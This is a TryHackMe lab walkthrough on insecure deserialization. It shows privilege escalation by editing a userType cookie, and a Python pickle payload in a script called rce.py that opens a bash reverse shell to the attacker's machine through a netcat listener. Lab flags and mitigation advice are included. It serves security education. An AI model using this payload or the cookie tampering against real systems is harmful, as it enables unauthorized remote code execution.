# 🐍 Insecure Deserialization (Cookie Manipulation & Remote Code Execution) – TryHackMe Walkthrough

## 📝 Overview

**Insecure Deserialization** occurs when applications deserialize untrusted data without validation. This can allow attackers to manipulate serialized objects, escalate privileges, or even achieve **Remote Code Execution (RCE)**.

This TryHackMe lab demonstrates two scenarios:

1. **Cookie Manipulation** – Modifying base64-encoded cookies to escalate privileges.
2. **Remote Code Execution via Python Pickle** – Crafting a malicious Pickle payload to gain a reverse shell.

---

## 🎯 Lab Objectives

* **Part 1 – Cookies**

  * Inspect and decode base64-encoded cookies to retrieve sensitive data.
  * Modify a `userType` cookie to escalate privileges and access the admin dashboard.

* **Part 2 – Remote Code Execution**

  * Craft a malicious Python Pickle payload to exploit insecure deserialization.
  * Achieve RCE and retrieve the final flag.

---

## 🛠 Steps to Exploit

### **Part 1 – Cookie Manipulation**

#### ✅ 1. Inspecting Cookies

* Created a new account and navigated to the **myprofile** page.
* Opened **Developer Tools → Storage → Cookies** (Firefox).
* Identified two cookies:

  * One base64-encoded
  * One plaintext (`userType`)

---

#### ✅ 2. Retrieving the First Flag

* Decoded the base64-encoded cookie (e.g., via [CyberChef](https://gchq.github.io/CyberChef/) or `base64 -d`) and found the first flag:

```
THM{good_old_base64_huh}
```

---

#### ✅ 3. Privilege Escalation via Cookie Modification

* Double-clicked the `userType` cookie and changed its value from `user` to `admin`.
* Navigated to **http\://MACHINE\_IP/admin** to access the admin dashboard.

**Flag Retrieved:**

```
THM{heres_the_admin_flag}
```

---

### **Part 2 – Remote Code Execution (Python Pickle)**

#### ✅ 1. Understanding the Vulnerability

* The Flask app sets an **`encodedPayload`** cookie when visiting **"Exchange your vim"**.
* On **"Provide your feedback!"**, the app **decodes & deserializes** the cookie with:

```python
pickle.loads(base64.b64decode(cookie))
```

* This allows execution of arbitrary Python objects during deserialization.

---

#### ✅ 2. Crafting a Malicious Pickle Payload

1. **Start a netcat listener**:

```bash
nc -lvnp 4444
```

2. **Create a Python script (`rce.py`)** to generate the payload:

```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('/bin/bash -c "bash -i >& /dev/tcp/YOUR_TRYHACKME_VPN_IP/4444 0>&1"',))

print(base64.b64encode(pickle.dumps(RCE())))
```

3. **Run the script**:

```bash
python3 rce.py
```

4. **Copy the output** (example):

```
gASVcgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjF... (truncated)
```

---

#### ✅ 3. Injecting the Payload

* Replaced the `encodedPayload` cookie in the browser with the malicious base64 string.
* Refreshed the **"Provide your feedback!"** page.
* The page hung – indicating the payload executed.

---

#### ✅ 4. Getting the Final Flag

* Switched to the reverse shell session in netcat:

```bash
ls
cat flag.txt
```

**Flag Retrieved:**

```
4a69a7ff9fd68
```

---

## ✅ Key Takeaways

* **Root Causes:**

  * Cookies stored sensitive information without proper encryption or integrity checks.
  * Flask app deserialized untrusted data using `pickle.loads()` without validation.

* **Impact:**

  * Unauthorized access to admin functionality.
  * Full Remote Code Execution on the server.

* **Mitigation:**

  * Use **signed and encrypted cookies** (Flask’s `itsdangerous` or JWT).
  * Avoid `pickle` for untrusted data; use safe serialization like JSON.
  * Validate and sanitize all user-controlled inputs.

---

## 🗺 MITRE ATT\&CK Mapping

| **Technique**                         | **ID**                                                      | **Description**                                                  |
| ------------------------------------- | ----------------------------------------------------------- | ---------------------------------------------------------------- |
| **Exploitation of Public-Facing App** | [T1190](https://attack.mitre.org/techniques/T1190/)         | Exploiting web app misconfiguration to gain unauthorized access. |
| **Command and Scripting Interpreter** | [T1059.006](https://attack.mitre.org/techniques/T1059/006/) | Executing commands via Python Pickle deserialization (RCE).      |
| **Valid Accounts**                    | [T1078](https://attack.mitre.org/techniques/T1078/)         | Using manipulated cookies to escalate privileges to admin.       |

